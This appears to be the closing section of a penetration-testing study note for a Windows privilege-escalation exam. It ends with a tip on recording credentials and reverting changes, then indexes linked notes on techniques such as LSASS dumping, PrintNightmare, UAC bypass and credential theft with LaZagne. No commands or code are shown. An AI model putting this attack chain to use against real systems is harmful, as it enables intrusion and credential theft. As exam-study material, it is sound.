21. **Document creds + changes as you go** (`proto://user:pass@host (source)`), and revert binPath/ownership/registry on real engagements — the exam grades the chain and the report.

---

## Related Vault Notes

- `[[01-intro]]` — privesc goals & attack surface
- `[[02-intro]]` — tools (winPEAS/Seatbelt/PowerUp/LaZagne/WES-NG)
- `[[03-situational-awareness]]` — network, Defender, AppLocker
- `[[04-initial-enumeration]]` — whoami/systeminfo/netstat/net user
- `[[05-communication-with-processes]]` — named pipes, localhost services
- `[[07-seimpersonate]]` — Potato family / PrintSpoofer
- `[[08-sedebugprivilege]]` — LSASS dump / parent-PID SYSTEM
- `[[09-setakeownershipprivilege]]` — takeown + icacls
- `[[10-backup-operators]]` — SeBackup / diskshadow / NTDS
- `[[11-event-log-readers]]` — creds in 4688 cmdline audit
- `[[12-dnsadmins]]` — serverlevelplugindll DLL on DC
- `[[13-hyperv-admin]]` — offline vhdx / vmms hardlink
- `[[14-print-operators]]` — SeLoadDriver / Capcom.sys
- `[[15-server-operators]]` — sc config binPath add-admin
- `[[16-user-account-control]]` — UAC bypass DLL hijack
- `[[17-weak-permissions]]` — ACL/service/unquoted/registry
- `[[18-kernel-exploits]]` — HiveNightmare/PrintNightmare/CVE-2020-0668
- `[[19-vulnerable-services]]` — Druva inSync RPC
- `[[20-dll-injection]]` — DLL hijack primitive
- `[[21-credential-hunting-notes]]` — findstr/DPAPI/PS history
- `[[22-other-files-notes]]` — Sticky Notes/file checklist
- `[[23-further-credential-theft-notes]]` — cmdkey/SharpChrome/KeePass/LaZagne/SessionGopher
- `[[24-citrix-breakout]]` — restricted-desktop escape
- `[[25-interacting-with-users]]` — SCF/LNK + Responder, procmon
- `[[26-pillaging]]` — mRemoteNG/cookies/restic
- `[[27-miscellaneous-techniques]]` — LOLBAS/AlwaysInstallElevated/CVE-2019-1388/schtasks/VHDX
- `[[28 — legacy-operating-systems]]` — EOL strategy
- `[[29-windows-server-privesc-notes]]` — Server 2008 / schelevator
- `[[30-windows-desktop-versions-privesc-notes]]` — Win7 / MS16-032 / WES-NG
- `[[31-windows-hardening ]]` — defender view (report remediation)
- `[[32-winprivesc-skills-assessment-part1]]` — cmd-injection → PrintNightmare → LaZagne
- `[[33-winprivesc-skills-assessment-part2]]` — unattend.xml → AlwaysInstallElevated → pwdump → hashcat

External cross-vault:
- AD pivot after SYSTEM: `[[../ad-enum-attacks/00-METHODOLOGY]]`
- Dual-homed host: `[[../pivoting-tunneling/00-METHODOLOGY]]`
- Initial foothold before privesc: `[[../getting-started/00-METHODOLOGY]]`
- Triage by symptom: `[[../ATTACK-PATHS]]` §5/§9
- Index: `[[../SEARCH]]`
